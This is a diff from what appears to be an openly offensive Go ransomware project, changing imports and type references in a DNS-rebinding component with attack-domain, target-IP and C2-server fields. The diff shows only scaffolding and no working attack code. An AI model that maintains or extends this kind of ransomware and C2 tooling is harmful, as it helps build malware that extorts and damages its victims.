@@ -1,11 +1,12 @@
 package ransomware
 
+import rw "github.com/ruby570bocadito/x404x/internal/ransomware"
+
 import (
 	"fmt"
 	"math/rand"
 	"net"
 	"net/http"
-	"os"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -13,14 +14,14 @@ import (
 )
 
 type DNSRebinding struct {
-	config       *RansomwareConfig
+	config       *rw.RansomwareConfig
 	listenPort   int
 	attackDomain string
 	targetIP     string
 	c2Server     string
 }
 
-func NewDNSRebinding(cfg *RansomwareConfig) *DNSRebinding {
+func NewDNSRebinding(cfg *rw.RansomwareConfig) *DNSRebinding {
 	return &DNSRebinding{
 		config:       cfg,
 		listenPort:   53,
